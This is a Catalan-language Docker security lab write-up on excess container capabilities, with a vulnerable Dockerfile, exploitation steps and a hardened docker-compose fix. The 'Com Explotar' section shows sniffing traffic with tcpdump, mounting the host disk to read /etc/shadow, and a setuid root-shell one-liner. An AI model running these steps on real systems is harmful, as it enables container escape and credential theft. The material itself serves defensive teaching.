# Vulnerabilitat 6: Capabilities Innecessaries

## Descripció Breu

Linux divideix els privilegis de root en unitats mes petites anomenades capabilities. Per defecte, Docker assigna un conjunt de capabilities als contenidors que en molts casos son excessives per a les necessitats reals de l'aplicació. Tenir capabilities innecessaries actives augmenta el risc que un atacant les pugui aprofitar per escalar privilegis o afectar el sistema host.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Capabilities com CAP_SYS_PTRACE permeten llegir la memoria d'altres processos
- **Integritat** -> Capabilities com CAP_SYS_ADMIN permeten modificar configuracions del kernel
- **Disponibilitat** -> Capabilities com CAP_SYS_KILL permeten aturar processos del sistema

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Alt |
| **CVE relacionat** | CWE-250 (Execution with Unnecessary Privileges) |
| **Impacte real** | Escapament del contenidor i compromis del host |
| **Escenari tipic** | Un atacant aprofita CAP_SYS_ADMIN per muntar sistemes de fitxers del host |

### Capabilities perilloses per defecte a Docker

| Capability | Funcio | Risc |
|---|---|---|
| `CAP_NET_ADMIN` | Configurar interficies de xarxa | Sniffing, modificar rutes |
| `CAP_SYS_ADMIN` | Operacions d'administracio del sistema | Muntatge de FS, escape del contenidor |
| `CAP_SYS_PTRACE` | Depuracio de processos | Llegir memoria d'altres processos |
| `CAP_SYS_MODULE` | Carregar moduls del kernel | Rootkits, backdoors al kernel |
| `CAP_DAC_OVERRIDE` | Saltar-se permisos de fitxers | Llegir qualsevol fitxer del sistema |
| `CAP_SETUID` | Canviar UID del proces | Escalada de privilegis |

---

## Implementació Vulnerable

```dockerfile
# Vulnerable: contenidor amb capabilities innecessaries
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y python3 libcap2-bin

WORKDIR /app

CMD ["python3", "-m", "http.server", "8080"]
```

### Verificació de la vulnerabilitat

```bash
# Construir i executar el contenidor vulnerable
docker build -f Dockerfile.vulnerable -t vuln-capabilities .
docker run -d -p 8089:8080 --name vuln-unnecessary-capabilities vuln-capabilities

# Veure les capabilities actives al contenidor
docker exec vuln-unnecessary-capabilities capsh --print
```

**Resultat esperat (capabilities per defecte de Docker):**
```
Current: cap_chown, cap_dac_override, cap_fowner, cap_fsetid,
cap_kill, cap_setgid, cap_setuid, cap_setpcap, cap_net_bind_service,
cap_net_raw, cap_sys_chroot, cap_mknod, cap_audit_write, cap_setfcap
```

---

## Com Explotar

### Pas 1: Comprovar capabilities disponibles
```bash
docker exec -it vuln-unnecessary-capabilities bash
capsh --print

# Verificar CAP_NET_RAW disponible
cat /proc/1/status | grep CapEff
```

### Pas 2: Aprofitar CAP_NET_RAW per fer sniffing
```bash
# Dins del contenidor vulnerable, capturar trafix de xarxa
apt-get install -y tcpdump
tcpdump -i eth0

# Pot capturar tot el trafix de la xarxa del contenidor
# incloses credencials en text pla
```

### Pas 3: Aprofitar CAP_SYS_ADMIN (si esta activa)
```bash
# Muntar el sistema de fitxers del host des del contenidor
docker run --cap-add SYS_ADMIN --rm -it vuln-capabilities bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Accés complet al sistema de fitxers del host
ls /mnt/host/etc/
cat /mnt/host/etc/shadow
```

### Pas 4: Aprofitar CAP_SETUID per escalar privilegis
```bash
# Dins del contenidor
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# Si CAP_SETUID esta activa, s'obte shell de root
```

---

## Solució — docker-compose.yml

```yaml
services:
  fixed-capabilities:
    build:
      context: .
      dockerfile: Dockerfile.fixed
    container_name: fixed-unnecessary-capabilities
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    security_opt:
      - no-new-privileges:true
```

### Verificació de la correcció

```bash
# Construir i executar el contenidor corregit
docker-compose up -d fixed-capabilities

# Comprovar les capabilities actives
docker exec fixed-unnecessary-capabilities capsh --print
```

**Resultat esperat:**
```
Current: cap_net_bind_service
```

```bash
# Intentar fer sniffing
docker exec fixed-unnecessary-capabilities tcpdump -i eth0
# Output: tcpdump: eth0: You don't have permission to capture on that device
```

---

## Explicació de la Solució

| Parametre | Funcio |
|---|---|
| `cap_drop: ALL` | Elimina absolutament totes les capabilities del contenidor |
| `cap_add: NET_BIND_SERVICE` | Afegeix nomes la capability necessaria per escoltar ports baixos (<1024) |
| `no-new-privileges: true` | Impedeix que els processos del contenidor adquireixin noves capabilities |

### Principi de minims privilegis aplicat a capabilities

En lloc de preguntar-se quines capabilities treure, cal preguntar-se quines capabilities minimes necessita realment l'aplicació:

| Tipus d'aplicació | Capabilities necessaries tipiques |
|---|---|
| Servidor web (port >1024) | Cap |
| Servidor web (port 80/443) | NET_BIND_SERVICE |
| Aplicació de xarxa | NET_BIND_SERVICE |
| Aplicació sense privilegis | Cap (cap_drop: ALL) |

---

## Bones Practiques

- Sempre usar `cap_drop: ALL` com a punt de partida i afegir nomes les necessaries
- Mai usar `--privileged` en contenidors de produccio
- Usar `no-new-privileges: true` a tots els contenidors
- Auditar periodacament les capabilities actives amb `capsh --print`
- Combinar amb un usuari no privilegiat (USER) per maxima seguretat
- Considerar l'us de seccomp profiles per a restriccions adicionals

---

## Referencies

- [Docker Security - Linux Kernel Capabilities](https://docs.docker.com/engine/security/#linux-kernel-capabilities)
- [Linux Capabilities Man Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [CWE-250: Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Docker Seccomp Profiles](https://docs.docker.com/engine/security/seccomp/)
